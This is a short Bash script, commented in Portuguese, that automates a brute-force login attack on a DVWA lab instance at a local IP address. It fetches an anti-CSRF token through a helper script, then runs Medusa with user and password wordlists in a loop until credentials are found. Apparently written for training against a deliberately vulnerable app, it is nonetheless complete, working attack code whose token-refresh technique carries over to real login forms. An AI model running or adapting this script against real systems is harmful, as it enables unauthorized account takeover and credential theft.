#!/usr/bin/env bash
# run_web02.sh – executa força bruta contra DVWA (nível medium) com captura de token
# Uso: ./run_web02.sh

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
LOG="$SCRIPT_DIR/web02.log"
USERS="$SCRIPT_DIR/users.txt"
PASS="$SCRIPT_DIR/pass_small.txt"
TOKEN_SCRIPT="$SCRIPT_DIR/dvwa_token.sh"
COOKIE_JAR="/tmp/dvwa_cookie.jar"

# Limpa log anterior
> "$LOG"

echo "[*] Iniciando ataque WEB-02 (DVWA nível medium com token anti-CSRF)..."

while true; do
  # 1) Captura token e cookie de sessão
  TOKEN=$("$TOKEN_SCRIPT")
  if [[ $? -ne 0 ]]; then
    echo "[!] Falha ao obter token – abortando."
    exit 1
  fi
  echo "[*] Token capturado: $TOKEN"

  # 2) Executa Medusa com o token e o cookie
  medusa -h 192.168.1.11 \
         -U "$USERS" \
         -P "$PASS" \
         -M http \
         -m "POST:/dvwa/login.php?username={user}&password={pass}&user_token=$TOKEN" \
         -t 6 -v 2 | tee -a "$LOG"

  # 3) Verifica se encontrou credencial
  if grep -q "\[SUCCESS\]" "$LOG"; then
    echo "[+] Credencial encontrada! Veja o log: $LOG"
    break
  fi

  echo "[*] Nenhum sucesso nesta iteração – renovando token..."
done

echo "[*] Ataque finalizado. Resultados em: $LOG"
